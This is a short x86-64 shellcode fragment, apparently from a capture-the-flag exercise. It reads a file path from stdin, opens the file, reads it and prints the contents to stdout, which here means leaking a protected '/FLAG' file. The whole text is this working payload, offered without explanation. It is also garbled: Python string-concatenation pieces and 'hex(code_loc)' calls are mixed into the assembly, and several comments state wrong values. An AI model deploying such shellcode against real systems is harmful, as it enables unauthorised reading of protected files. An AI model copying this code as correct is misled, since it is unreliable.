# read "/FLAG" from stdin
mov rax, 0
mov rdi, 0
mov rsi, hex(code_loc)
mov rdx, 6
syscall
# open("/FLAG"(code_loc), O_RDONLY)
mov rax, 2
mov rdi, hex(code_loc)
mov rsi, 0
syscall
# read(fd, code_loc + 0x6, 1000(0x400));
mov rdi, rax
mov rax, 0
mov rsi, " + hex(code_loc+0x6) + "
mov rdx, 0x400
syscall
# write(1, code_loc + 0x6, 1000(0x42))
mov rax, 1
mov rdi, 1
mov rsi," + hex(code_loc+0x6) +" 
mov rdx, 0x42
syscall
#exit(0)
mov rax, 60
mov rdi, 0
syscall
